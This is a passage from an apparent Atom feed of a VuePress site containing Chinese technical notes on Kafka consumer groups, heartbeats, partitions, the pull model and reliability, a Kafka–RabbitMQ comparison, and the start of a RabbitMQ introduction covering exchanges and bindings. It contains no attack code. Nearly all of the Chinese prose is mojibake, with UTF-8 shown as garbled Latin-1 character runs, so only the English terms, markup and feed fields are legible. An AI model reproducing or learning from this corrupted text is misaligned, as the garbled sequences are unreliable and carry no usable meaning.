æˆæ•´ä¸ªæ¶ˆè´¹ç»„çŸ­æš‚çš„ä¸å¯ç”¨ã€‚**è€Œä¸”ï¼Œå°†åˆ†åŒºè¿›è¡Œé‡å¹³è¡¡ä¹Ÿä¼šå¯¼è‡´åŸæ¥çš„æ¶ˆè´¹è€…çŠ¶æ€è¿‡æœŸï¼Œä»è€Œå¯¼è‡´æ¶ˆè´¹è€…éœ€è¦é‡æ–°æ›´æ–°çŠ¶æ€ï¼Œè¿™æ®µæœŸé—´ä¹Ÿä¼šé™ä½æ¶ˆè´¹æ€§èƒ½ã€‚åé¢æˆ‘ä»¬ä¼šè®¨è®ºå¦‚ä½•å®‰å…¨çš„è¿›è¡Œé‡å¹³è¡¡ä»¥åŠå¦‚ä½•å°½å¯èƒ½é¿å…ã€‚</p>
<p>æ¶ˆè´¹è€…é€šè¿‡å®šæœŸå‘é€å¿ƒè·³ï¼ˆhearbeatï¼‰åˆ°ä¸€ä¸ªä½œä¸ºç»„åè°ƒè€…ï¼ˆgroup coordinatorï¼‰çš„ broker æ¥ä¿æŒåœ¨æ¶ˆè´¹ç»„å†…å­˜æ´»ã€‚è¿™ä¸ª broker ä¸æ˜¯å›ºå®šçš„ï¼Œæ¯ä¸ªæ¶ˆè´¹ç»„éƒ½å¯èƒ½ä¸åŒã€‚å½“æ¶ˆè´¹è€…æ‹‰å–æ¶ˆæ¯æˆ–è€…æäº¤æ—¶ï¼Œä¾¿ä¼šå‘é€å¿ƒè·³ã€‚</p>
<p>å¦‚æœæ¶ˆè´¹è€…è¶…è¿‡ä¸€å®šæ—¶é—´æ²¡æœ‰å‘é€å¿ƒè·³ï¼Œé‚£ä¹ˆå®ƒçš„ä¼šè¯ï¼ˆsessionï¼‰å°±ä¼šè¿‡æœŸï¼Œç»„åè°ƒè€…ä¼šè®¤ä¸ºè¯¥æ¶ˆè´¹è€…å·²ç»å®•æœºï¼Œç„¶åè§¦å‘é‡å¹³è¡¡ã€‚å¯ä»¥çœ‹åˆ°ï¼Œä»æ¶ˆè´¹è€…å®•æœºåˆ°ä¼šè¯è¿‡æœŸæ˜¯æœ‰ä¸€å®šæ—¶é—´çš„ï¼Œè¿™æ®µæ—¶é—´å†…è¯¥æ¶ˆè´¹è€…çš„åˆ†åŒºéƒ½ä¸èƒ½è¿›è¡Œæ¶ˆæ¯æ¶ˆè´¹ï¼›é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œä¼˜é›…å…³é—­ï¼Œè¿™æ ·æ¶ˆè´¹è€…ä¼šå‘é€ç¦»å¼€çš„æ¶ˆæ¯åˆ°ç»„åè°ƒè€…ï¼Œè¿™æ ·ç»„åè°ƒè€…å¯ä»¥ç«‹å³è¿›è¡Œé‡å¹³è¡¡è€Œä¸éœ€è¦ç­‰å¾…ä¼šè¯è¿‡æœŸã€‚</p>
<p>åœ¨ 0.10.1 ç‰ˆæœ¬ï¼ŒKafka å¯¹å¿ƒè·³æœºåˆ¶è¿›è¡Œäº†ä¿®æ”¹ï¼Œå°†å‘é€å¿ƒè·³ä¸æ‹‰å–æ¶ˆæ¯è¿›è¡Œåˆ†ç¦»ï¼Œè¿™æ ·ä½¿å¾—å‘é€å¿ƒè·³çš„é¢‘ç‡ä¸å—æ‹‰å–çš„é¢‘ç‡å½±å“ã€‚å¦å¤–æ›´é«˜ç‰ˆæœ¬çš„ Kafka æ”¯æŒé…ç½®ä¸€ä¸ªæ¶ˆè´¹è€…å¤šé•¿æ—¶é—´ä¸æ‹‰å–æ¶ˆæ¯ä½†ä»ç„¶ä¿æŒå­˜æ´»ï¼Œè¿™ä¸ªé…ç½®å¯ä»¥é¿å…æ´»é”ï¼ˆlivelockï¼‰ã€‚æ´»é”ï¼Œæ˜¯æŒ‡åº”ç”¨æ²¡æœ‰æ•…éšœä½†æ˜¯ç”±äºæŸäº›åŸå› ä¸èƒ½è¿›ä¸€æ­¥æ¶ˆè´¹ã€‚</p>
<h3 id="partition-ä¸æ¶ˆè´¹æ¨¡å‹" tabindex="-1"> Partition ä¸æ¶ˆè´¹æ¨¡å‹</h3>
<p>ä¸Šé¢æåˆ°ï¼ŒKafka ä¸­ä¸€ä¸ª topic ä¸­çš„æ¶ˆæ¯æ˜¯è¢«æ‰“æ•£åˆ†é…åœ¨å¤šä¸ª Partition(åˆ†åŒº) ä¸­å­˜å‚¨çš„ï¼Œ Consumer Group åœ¨æ¶ˆè´¹æ—¶éœ€è¦ä»ä¸åŒçš„ Partition è·å–æ¶ˆæ¯ï¼Œé‚£æœ€ç»ˆå¦‚ä½•é‡å»ºå‡º Topic ä¸­æ¶ˆæ¯çš„é¡ºåºå‘¢ï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯ï¼šæ²¡æœ‰åŠæ³•ã€‚Kafka åªä¼šä¿è¯åœ¨ Partition å†…æ¶ˆæ¯æ˜¯æœ‰åºçš„ï¼Œè€Œä¸ç®¡å…¨å±€çš„æƒ…å†µã€‚</p>
<p>ä¸‹ä¸€ä¸ªé—®é¢˜æ˜¯ï¼šPartition ä¸­çš„æ¶ˆæ¯å¯ä»¥è¢«ï¼ˆä¸åŒçš„ Consumer Groupï¼‰å¤šæ¬¡æ¶ˆè´¹ï¼Œé‚£ Partitionä¸­è¢«æ¶ˆè´¹çš„æ¶ˆæ¯æ˜¯ä½•æ—¶åˆ é™¤çš„ï¼Ÿ Partition åˆæ˜¯å¦‚ä½•çŸ¥é“ä¸€ä¸ª Consumer Group å½“å‰æ¶ˆè´¹çš„ä½ç½®å‘¢ï¼Ÿ</p>
<p>æ— è®ºæ¶ˆæ¯æ˜¯å¦è¢«æ¶ˆè´¹ï¼Œé™¤éæ¶ˆæ¯åˆ°æœŸ Partition ä»ä¸åˆ é™¤æ¶ˆæ¯ã€‚ä¾‹å¦‚è®¾ç½®ä¿ç•™æ—¶é—´ä¸º 2 å¤©ï¼Œåˆ™æ¶ˆæ¯å‘å¸ƒ 2 å¤©å†…ä»»ä½• Group éƒ½å¯ä»¥æ¶ˆè´¹ï¼Œ2 å¤©åï¼Œæ¶ˆæ¯è‡ªåŠ¨è¢«åˆ é™¤ã€‚
Partition ä¼šä¸ºæ¯ä¸ª Consumer Group ä¿å­˜ä¸€ä¸ªåç§»é‡ï¼Œè®°å½• Group æ¶ˆè´¹åˆ°çš„ä½ç½®ã€‚ å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-Partitionä¸æ¶ˆè´¹æ¨¡å‹.png" alt="" loading="lazy"></p>
<h3 id="æ¶ˆè´¹è€…çš„-pull-æ¨¡å‹" tabindex="-1"> æ¶ˆè´¹è€…çš„ pull æ¨¡å‹</h3>
<p>æ¶ˆè´¹è€…åº”è¯¥å‘ Broker è¦æ•°æ®ï¼ˆpullï¼‰è¿˜æ˜¯ Broker å‘æ¶ˆè´¹è€…æ¨é€æ•°æ®ï¼ˆpushï¼‰ï¼Ÿä½œä¸ºä¸€ä¸ªæ¶ˆæ¯ç³»ç»Ÿï¼ŒKafka éµå¾ªäº†ä¼ ç»Ÿçš„æ–¹å¼ï¼Œé€‰æ‹©ç”± Producer å‘ broker push æ¶ˆæ¯å¹¶ç”± Consumer ä» broker pull æ¶ˆæ¯ã€‚ä¸€äº› logging-centric systemï¼Œæ¯”å¦‚ Facebook çš„<a href="https://github.com/facebookarchive/scribe" target="_blank" rel="noopener noreferrer">Scribe</a>å’Œ Cloudera çš„<a href="https://flume.apache.org/" target="_blank" rel="noopener noreferrer">Flume</a>ï¼Œé‡‡ç”¨ push æ¨¡å¼ã€‚äº‹å®ä¸Šï¼Œpush æ¨¡å¼å’Œ pull æ¨¡å¼å„æœ‰ä¼˜åŠ£ã€‚</p>
<p><strong>push æ¨¡å¼å¾ˆéš¾é€‚åº”æ¶ˆè´¹é€Ÿç‡ä¸åŒçš„æ¶ˆè´¹è€…ï¼Œå› ä¸ºæ¶ˆæ¯å‘é€é€Ÿç‡æ˜¯ç”± broker å†³å®šçš„</strong>ã€‚push æ¨¡å¼çš„ç›®æ ‡æ˜¯å°½å¯èƒ½ä»¥æœ€å¿«é€Ÿåº¦ä¼ é€’æ¶ˆæ¯ï¼Œä½†æ˜¯è¿™æ ·å¾ˆå®¹æ˜“é€ æˆ Consumer æ¥ä¸åŠå¤„ç†æ¶ˆæ¯ï¼Œå…¸å‹çš„è¡¨ç°å°±æ˜¯æ‹’ç»æœåŠ¡ä»¥åŠç½‘ç»œæ‹¥å¡ã€‚<strong>è€Œ pull æ¨¡å¼åˆ™å¯ä»¥æ ¹æ® Consumer çš„æ¶ˆè´¹èƒ½åŠ›ä»¥é€‚å½“çš„é€Ÿç‡æ¶ˆè´¹æ¶ˆæ¯ã€‚</strong></p>
<p><strong>å¯¹äº Kafka è€Œè¨€ï¼Œpull æ¨¡å¼æ›´åˆé€‚</strong>ï¼Œpull æ¨¡å¼å¯ç®€åŒ– broker çš„è®¾è®¡ï¼ŒConsumer å¯è‡ªä¸»æ§åˆ¶æ¶ˆè´¹æ¶ˆæ¯çš„é€Ÿç‡ï¼ŒåŒæ—¶ Consumer å¯ä»¥è‡ªå·±æ§åˆ¶æ¶ˆè´¹æ–¹å¼â€”â€”å³å¯æ‰¹é‡æ¶ˆè´¹ä¹Ÿå¯é€æ¡æ¶ˆè´¹ï¼ŒåŒæ—¶è¿˜èƒ½é€‰æ‹©ä¸åŒçš„æäº¤æ–¹å¼ä»è€Œå®ç°ä¸åŒçš„ä¼ è¾“è¯­ä¹‰ã€‚</p>
<h2 id="kafka-å¯é æ€§" tabindex="-1"> Kafka å¯é æ€§</h2>
<p>Kafka ä¸­çš„å¯é æ€§ä¿è¯æœ‰å¦‚ä¸‹å››ç‚¹ï¼š</p>
<ul>
<li>å¯¹äºä¸€ä¸ªåˆ†åŒºæ¥è¯´ï¼Œå®ƒçš„æ¶ˆæ¯æ˜¯æœ‰åºçš„ã€‚å¦‚æœä¸€ä¸ªç”Ÿäº§è€…å‘ä¸€ä¸ªåˆ†åŒºå…ˆå†™å…¥æ¶ˆæ¯Aï¼Œç„¶åå†™å…¥æ¶ˆæ¯Bï¼Œé‚£ä¹ˆæ¶ˆè´¹è€…ä¼šå…ˆè¯»å–æ¶ˆæ¯Aå†è¯»å–æ¶ˆæ¯Bã€‚</li>
<li>å½“æ¶ˆæ¯å†™å…¥æ‰€æœ‰in-syncçŠ¶æ€çš„å‰¯æœ¬åï¼Œæ¶ˆæ¯æ‰ä¼šè®¤ä¸º<strong>å·²æäº¤ï¼ˆcommittedï¼‰</strong>ã€‚è¿™é‡Œçš„å†™å…¥æœ‰å¯èƒ½åªæ˜¯å†™å…¥åˆ°æ–‡ä»¶ç³»ç»Ÿçš„ç¼“å­˜ï¼Œä¸ä¸€å®šåˆ·æ–°åˆ°ç£ç›˜ã€‚ç”Ÿäº§è€…å¯ä»¥ç­‰å¾…ä¸åŒæ—¶æœºçš„ç¡®è®¤ï¼Œæ¯”å¦‚ç­‰å¾…åˆ†åŒºä¸»å‰¯æœ¬å†™å…¥å³è¿”å›ï¼Œåè€…ç­‰å¾…æ‰€æœ‰in-syncçŠ¶æ€å‰¯æœ¬å†™å…¥æ‰è¿”å›ã€‚</li>
<li>ä¸€æ—¦æ¶ˆæ¯å·²æäº¤ï¼Œé‚£ä¹ˆåªè¦æœ‰ä¸€ä¸ªå‰¯æœ¬å­˜æ´»ï¼Œæ•°æ®ä¸ä¼šä¸¢å¤±ã€‚</li>
<li>æ¶ˆè´¹è€…åªèƒ½è¯»å–åˆ°å·²æäº¤çš„æ¶ˆæ¯ã€‚</li>
</ul>
<p>ä½¿ç”¨è¿™äº›åŸºç¡€ä¿è¯ï¼Œæˆ‘ä»¬æ„å»ºä¸€ä¸ªå¯é çš„ç³»ç»Ÿï¼Œè¿™æ—¶å€™éœ€è¦è€ƒè™‘ä¸€ä¸ªé—®é¢˜ï¼šç©¶ç«Ÿæˆ‘ä»¬çš„åº”ç”¨éœ€è¦å¤šå¤§ç¨‹åº¦çš„å¯é æ€§ï¼Ÿå¯é æ€§ä¸æ˜¯æ— å¿çš„ï¼Œå®ƒä¸ç³»ç»Ÿå¯ç”¨æ€§ã€ååé‡ã€å»¶è¿Ÿå’Œç¡¬ä»¶ä»·æ ¼æ¯æ¯ç›¸å…³ï¼Œå¾—æ­¤å¤±å½¼ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦åšæƒè¡¡ï¼Œä¸€å‘³çš„è¿½æ±‚å¯é æ€§å¹¶ä¸å®é™…ã€‚</p>
<h1 id="å¯¹æ¯”rocketmq" tabindex="-1"> å¯¹æ¯”RocketMQ</h1>
<h2 id="æ¶ˆæ¯æ¶ˆè´¹" tabindex="-1"> æ¶ˆæ¯æ¶ˆè´¹</h2>
<h3 id="æ¶ˆæ¯æŠ•é€’å®æ—¶æ€§" tabindex="-1"> æ¶ˆæ¯æŠ•é€’å®æ—¶æ€§</h3>
<ul>
<li>Kafkaä½¿ç”¨çŸ­è½®è¯¢æ–¹å¼ï¼Œå®æ—¶æ€§å–å†³äºè½®è¯¢é—´éš”æ—¶é—´</li>
<li>RocketMQä½¿ç”¨é•¿è½®è¯¢ï¼ŒåŒPushæ–¹å¼å®æ—¶æ€§ä¸€è‡´ï¼Œæ¶ˆæ¯çš„æŠ•é€’å»¶æ—¶é€šå¸¸åœ¨å‡ ä¸ªæ¯«ç§’ã€‚</li>
</ul>
<h3 id="æ¶ˆè´¹å¤±è´¥é‡è¯•" tabindex="-1"> æ¶ˆè´¹å¤±è´¥é‡è¯•</h3>
<ul>
<li>Kafkaæ¶ˆè´¹å¤±è´¥ä¸æ”¯æŒé‡è¯•</li>
<li>RocketMQæ¶ˆè´¹å¤±è´¥æ”¯æŒå®šæ—¶é‡è¯•ï¼Œæ¯æ¬¡é‡è¯•é—´éš”æ—¶é—´é¡ºå»¶</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">æ¡†æ¶</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">RabbitMQ ä»‹ç»</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/RabbitMQ.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/RabbitMQ.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>

<h1 id="rabbitmq-ä»‹ç»" tabindex="-1"> RabbitMQ ä»‹ç»</h1>
<h2 id="ç®€ä»‹" tabindex="-1"> ç®€ä»‹</h2>
<p>RabbitMQ æ˜¯é‡‡ç”¨ Erlang è¯­è¨€å®ç° AMQP(Advanced Message Queuing Protocolï¼Œé«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®ï¼‰çš„æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œå®ƒæœ€åˆèµ·æºäºé‡‘èç³»ç»Ÿï¼Œç”¨äºåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å­˜å‚¨è½¬å‘æ¶ˆæ¯ã€‚</p>
<p>RabbitMQ å‘å±•åˆ°ä»Šå¤©ï¼Œè¢«è¶Šæ¥è¶Šå¤šçš„äººè®¤å¯ï¼Œè¿™å’Œå®ƒåœ¨æ˜“ç”¨æ€§ã€æ‰©å±•æ€§ã€å¯é æ€§å’Œé«˜å¯ç”¨æ€§ç­‰æ–¹é¢çš„å“è‘—è¡¨ç°æ˜¯åˆ†ä¸å¼€çš„ã€‚RabbitMQ çš„å…·ä½“ç‰¹ç‚¹å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ul>
<li><strong>å¯é æ€§ï¼š</strong> RabbitMQä½¿ç”¨ä¸€äº›æœºåˆ¶æ¥ä¿è¯æ¶ˆæ¯çš„å¯é æ€§ï¼Œå¦‚æŒä¹…åŒ–ã€ä¼ è¾“ç¡®è®¤åŠå‘å¸ƒç¡®è®¤ç­‰ã€‚</li>
<li><strong>çµæ´»çš„è·¯ç”±ï¼š</strong> åœ¨æ¶ˆæ¯è¿›å…¥é˜Ÿåˆ—ä¹‹å‰ï¼Œé€šè¿‡äº¤æ¢å™¨æ¥è·¯ç”±æ¶ˆæ¯ã€‚å¯¹äºå…¸å‹çš„è·¯ç”±åŠŸèƒ½ï¼ŒRabbitMQ å·±ç»æä¾›äº†ä¸€äº›å†…ç½®çš„äº¤æ¢å™¨æ¥å®ç°ã€‚é’ˆå¯¹æ›´å¤æ‚çš„è·¯ç”±åŠŸèƒ½ï¼Œå¯ä»¥å°†å¤šä¸ªäº¤æ¢å™¨ç»‘å®šåœ¨ä¸€èµ·ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ’ä»¶æœºåˆ¶æ¥å®ç°è‡ªå·±çš„äº¤æ¢å™¨ã€‚è¿™ä¸ªåé¢ä¼šåœ¨æˆ‘ä»¬å°† RabbitMQ æ ¸å¿ƒæ¦‚å¿µçš„æ—¶å€™è¯¦ç»†ä»‹ç»åˆ°ã€‚</li>
<li><strong>æ‰©å±•æ€§ï¼š</strong> å¤šä¸ªRabbitMQèŠ‚ç‚¹å¯ä»¥ç»„æˆä¸€ä¸ªé›†ç¾¤ï¼Œä¹Ÿå¯ä»¥æ ¹æ®å®é™…ä¸šåŠ¡æƒ…å†µåŠ¨æ€åœ°æ‰©å±•é›†ç¾¤ä¸­èŠ‚ç‚¹ã€‚</li>
<li><strong>é«˜å¯ç”¨æ€§ï¼š</strong> é˜Ÿåˆ—å¯ä»¥åœ¨é›†ç¾¤ä¸­çš„æœºå™¨ä¸Šè®¾ç½®é•œåƒï¼Œä½¿å¾—åœ¨éƒ¨åˆ†èŠ‚ç‚¹å‡ºç°é—®é¢˜çš„æƒ…å†µä¸‹é˜Ÿåˆ—ä»ç„¶å¯ç”¨ã€‚</li>
<li><strong>æ”¯æŒå¤šç§åè®®ï¼š</strong> RabbitMQ é™¤äº†åŸç”Ÿæ”¯æŒ AMQP åè®®ï¼Œè¿˜æ”¯æŒ STOMPã€MQTT ç­‰å¤šç§æ¶ˆæ¯ä¸­é—´ä»¶åè®®ã€‚</li>
<li><strong>å¤šè¯­è¨€å®¢æˆ·ç«¯ï¼š</strong> RabbitMQå‡ ä¹æ”¯æŒæ‰€æœ‰å¸¸ç”¨è¯­è¨€ï¼Œæ¯”å¦‚ Javaã€Pythonã€Rubyã€PHPã€C#ã€JavaScriptç­‰ã€‚</li>
<li><strong>æ˜“ç”¨çš„ç®¡ç†ç•Œé¢ï¼š</strong> RabbitMQæä¾›äº†ä¸€ä¸ªæ˜“ç”¨çš„ç”¨æˆ·ç•Œé¢ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥ç›‘æ§å’Œç®¡ç†æ¶ˆæ¯ã€é›†ç¾¤ä¸­çš„èŠ‚ç‚¹ç­‰ã€‚åœ¨å®‰è£… RabbitMQ çš„æ—¶å€™ä¼šä»‹ç»åˆ°ï¼Œå®‰è£…å¥½ RabbitMQ å°±è‡ªå¸¦ç®¡ç†ç•Œé¢ã€‚</li>
<li><strong>æ’ä»¶æœºåˆ¶ï¼š</strong> RabbitMQ æä¾›äº†è®¸å¤šæ’ä»¶ï¼Œä»¥å®ç°ä»å¤šæ–¹é¢è¿›è¡Œæ‰©å±•ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç¼–å†™è‡ªå·±çš„æ’ä»¶ã€‚æ„Ÿè§‰è¿™ä¸ªæœ‰ç‚¹ç±»ä¼¼ Dubbo çš„ SPIæœºåˆ¶ã€‚</li>
</ul>
<h2 id="æ ¸å¿ƒæ¦‚å¿µ" tabindex="-1"> æ ¸å¿ƒæ¦‚å¿µ</h2>
<p>RabbitMQ æ•´ä½“ä¸Šæ˜¯ä¸€ä¸ªç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…æ¨¡å‹ï¼Œä¸»è¦è´Ÿè´£æ¥æ”¶ã€å­˜å‚¨å’Œè½¬å‘æ¶ˆæ¯ã€‚å¯ä»¥æŠŠæ¶ˆæ¯ä¼ é€’çš„è¿‡ç¨‹æƒ³è±¡æˆï¼šå½“ä½ å°†ä¸€ä¸ªåŒ…è£¹é€åˆ°é‚®å±€ï¼Œé‚®å±€ä¼šæš‚å­˜å¹¶æœ€ç»ˆå°†é‚®ä»¶é€šè¿‡é‚®é€’å‘˜é€åˆ°æ”¶ä»¶äººçš„æ‰‹ä¸Šï¼ŒRabbitMQå°±å¥½æ¯”ç”±é‚®å±€ã€é‚®ç®±å’Œé‚®é€’å‘˜ç»„æˆçš„ä¸€ä¸ªç³»ç»Ÿã€‚ä»è®¡ç®—æœºæœ¯è¯­å±‚é¢æ¥è¯´ï¼ŒRabbitMQ æ¨¡å‹æ›´åƒæ˜¯ä¸€ç§äº¤æ¢æœºæ¨¡å‹ã€‚</p>
<p><img src="@source/assets/cs-note/framework/message-queue/RabbitMQæ¶æ„.png" alt="RabbitMQ çš„æ•´ä½“æ¨¡å‹æ¶æ„" loading="lazy"></p>
<h3 id="producer-ç”Ÿäº§è€…-å’Œ-consumer-æ¶ˆè´¹è€…" tabindex="-1"> Producer(ç”Ÿäº§è€…) å’Œ Consumer(æ¶ˆè´¹è€…)</h3>
<ul>
<li><strong>Producer(ç”Ÿäº§è€…)</strong> :ç”Ÿäº§æ¶ˆæ¯çš„ä¸€æ–¹ï¼ˆé‚®ä»¶æŠ•é€’è€…ï¼‰</li>
<li><strong>Consumer(æ¶ˆè´¹è€…)</strong> :æ¶ˆè´¹æ¶ˆæ¯çš„ä¸€æ–¹ï¼ˆé‚®ä»¶æ”¶ä»¶äººï¼‰</li>
</ul>
<p>æ¶ˆæ¯ä¸€èˆ¬ç”± 2 éƒ¨åˆ†ç»„æˆï¼š<strong>æ¶ˆæ¯å¤´</strong>ï¼ˆæˆ–è€…è¯´æ˜¯æ ‡ç­¾ Labelï¼‰å’Œ <strong>æ¶ˆæ¯ä½“</strong>ã€‚æ¶ˆæ¯ä½“ä¹Ÿå¯ä»¥ç§°ä¸º payLoad ,æ¶ˆæ¯ä½“æ˜¯ä¸é€æ˜çš„ï¼Œè€Œæ¶ˆæ¯å¤´åˆ™ç”±ä¸€ç³»åˆ—çš„å¯é€‰å±æ€§ç»„æˆï¼Œè¿™äº›å±æ€§åŒ…æ‹¬ routing-keyï¼ˆè·¯ç”±é”®ï¼‰ã€priorityï¼ˆç›¸å¯¹äºå…¶ä»–æ¶ˆæ¯çš„ä¼˜å…ˆæƒï¼‰ã€delivery-modeï¼ˆæŒ‡å‡ºè¯¥æ¶ˆæ¯å¯èƒ½éœ€è¦æŒä¹…æ€§å­˜å‚¨ï¼‰ç­‰ã€‚ç”Ÿäº§è€…æŠŠæ¶ˆæ¯äº¤ç”± RabbitMQ åï¼ŒRabbitMQ ä¼šæ ¹æ®æ¶ˆæ¯å¤´æŠŠæ¶ˆæ¯å‘é€ç»™æ„Ÿå…´è¶£çš„ Consumer(æ¶ˆè´¹è€…)ã€‚</p>
<h3 id="exchange-äº¤æ¢å™¨" tabindex="-1"> Exchange(äº¤æ¢å™¨)</h3>
<p>åœ¨ RabbitMQ ä¸­ï¼Œæ¶ˆæ¯å¹¶ä¸æ˜¯ç›´æ¥è¢«æŠ•é€’åˆ° <strong>Queue(æ¶ˆæ¯é˜Ÿåˆ—)</strong> ä¸­çš„ï¼Œä¸­é—´è¿˜å¿…é¡»ç»è¿‡ <strong>Exchange(äº¤æ¢å™¨)</strong> è¿™ä¸€å±‚ï¼Œ<strong>Exchange(äº¤æ¢å™¨)</strong> ä¼šæŠŠæˆ‘ä»¬çš„æ¶ˆæ¯åˆ†é…åˆ°å¯¹åº”çš„ <strong>Queue(æ¶ˆæ¯é˜Ÿåˆ—)</strong> ä¸­ã€‚</p>
<p><strong>Exchange(äº¤æ¢å™¨)</strong> ç”¨æ¥æ¥æ”¶ç”Ÿäº§è€…å‘é€çš„æ¶ˆæ¯å¹¶å°†è¿™äº›æ¶ˆæ¯è·¯ç”±ç»™æœåŠ¡å™¨ä¸­çš„é˜Ÿåˆ—ä¸­ï¼Œå¦‚æœè·¯ç”±ä¸åˆ°ï¼Œæˆ–è®¸ä¼šè¿”å›ç»™ <strong>Producer(ç”Ÿäº§è€…)</strong> ï¼Œæˆ–è®¸ä¼šè¢«ç›´æ¥ä¸¢å¼ƒæ‰ ã€‚è¿™é‡Œå¯ä»¥å°†RabbitMQä¸­çš„äº¤æ¢å™¨çœ‹ä½œä¸€ä¸ªç®€å•çš„å®ä½“ã€‚</p>
<p><strong>RabbitMQ çš„ Exchange(äº¤æ¢å™¨) æœ‰4ç§ç±»å‹ï¼Œä¸åŒçš„ç±»å‹å¯¹åº”ç€ä¸åŒçš„è·¯ç”±ç­–ç•¥</strong>ï¼š<strong>direct(é»˜è®¤)</strong>ï¼Œ<strong>fanout</strong>, <strong>topic</strong>, å’Œ <strong>headers</strong>ï¼Œä¸åŒç±»å‹çš„Exchangeè½¬å‘æ¶ˆæ¯çš„ç­–ç•¥æœ‰æ‰€åŒºåˆ«ã€‚è¿™ä¸ªä¼šåœ¨ä»‹ç» <strong>Exchange Types(äº¤æ¢å™¨ç±»å‹)</strong> çš„æ—¶å€™ä»‹ç»åˆ°ã€‚</p>
<p>Exchange(äº¤æ¢å™¨) ç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="@source/assets/cs-note/framework/message-queue/RabbitMQ-Exchange.png" alt="Exchange(äº¤æ¢å™¨) ç¤ºæ„å›¾" loading="lazy"></p>
<p>ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘ç»™äº¤æ¢å™¨çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šæŒ‡å®šä¸€ä¸ª <strong>RoutingKey(è·¯ç”±é”®)</strong>ï¼Œç”¨æ¥æŒ‡å®šè¿™ä¸ªæ¶ˆæ¯çš„è·¯ç”±è§„åˆ™ï¼Œè€Œè¿™ä¸ª <strong>RoutingKey éœ€è¦ä¸äº¤æ¢å™¨ç±»å‹å’Œç»‘å®šé”®(BindingKey)è”åˆä½¿ç”¨æ‰èƒ½æœ€ç»ˆç”Ÿæ•ˆ</strong>ã€‚</p>
<p>RabbitMQ ä¸­é€šè¿‡ <strong>Binding(ç»‘å®š)</strong> å°† <strong>Exchange(äº¤æ¢å™¨)</strong> ä¸ <strong>Queue(æ¶ˆæ¯é˜Ÿåˆ—)</strong> å…³è”èµ·æ¥ï¼Œåœ¨ç»‘å®šçš„æ—¶å€™ä¸€èˆ¬ä¼šæŒ‡å®šä¸€ä¸ª <strong>BindingKey(ç»‘å®šå»º)</strong> ,è¿™æ · RabbitMQ å°±çŸ¥é“å¦‚ä½•æ­£ç¡®å°†æ¶ˆæ¯è·¯ç”±åˆ°é˜Ÿåˆ—äº†,å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ä¸€ä¸ªç»‘å®šå°±æ˜¯åŸºäºè·¯ç”±é”®å°†äº¤æ¢å™¨å’Œæ¶ˆæ¯é˜Ÿåˆ—è¿æ¥èµ·æ¥çš„è·¯ç”±è§„åˆ™ï¼Œæ‰€ä»¥å¯ä»¥å°†äº¤æ¢å™¨ç†è§£æˆä¸€ä¸ªç”±ç»‘å®šæ„æˆçš„è·¯ç”±è¡¨ã€‚Exchange å’Œ Queue çš„ç»‘å®šå¯ä»¥æ˜¯å¤šå¯¹å¤šçš„å…³ç³»ã€‚</p>
<p>Binding(ç»‘å®š) ç¤ºæ„å›¾ï¼š</p>
<p><img src="@source/assets/cs-note/framework/message-queue/RabbitMQ-Binding.png" alt="Binding(ç»‘å®š) ç¤ºæ„å›¾" loading="lazy"></p>
<p>ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€ç»™äº¤æ¢å™¨æ—¶ï¼Œéœ€è¦ä¸€ä¸ªRoutingKey,å½“ BindingKey å’Œ RoutingKey ç›¸åŒ¹é…æ—¶ï¼Œæ¶ˆæ¯ä¼šè¢«è·¯ç”±åˆ°å¯¹åº”çš„é˜Ÿåˆ—ä¸­ã€‚åœ¨ç»‘å®šå¤šä¸ªé˜Ÿåˆ—åˆ°åŒä¸€ä¸ªäº¤æ¢å™¨çš„æ—¶å€™ï¼Œè¿™äº›ç»‘å®šå…è®¸ä½¿ç”¨ç›¸åŒçš„ BindingKeyã€‚BindingKey å¹¶ä¸æ˜¯åœ¨æ‰€æœ‰çš„æƒ…å†µä¸‹éƒ½ç”Ÿæ•ˆï¼Œå®ƒä¾èµ–äºäº¤æ¢å™¨ç±»å‹ï¼Œæ¯”å¦‚fanoutç±»å‹çš„äº¤æ¢å™¨å°±ä¼šæ— è§†ï¼Œè€Œæ˜¯å°†æ¶ˆæ¯è·¯ç”±åˆ°æ‰€æœ‰ç»‘å®šåˆ°è¯¥äº¤æ¢å™¨çš„é˜Ÿåˆ—ä¸­ã€‚</p>
<h3 id="queue-æ¶ˆæ¯é˜Ÿåˆ—" tabindex="-1"> Queue(æ¶ˆæ¯é˜Ÿåˆ—)</h3>
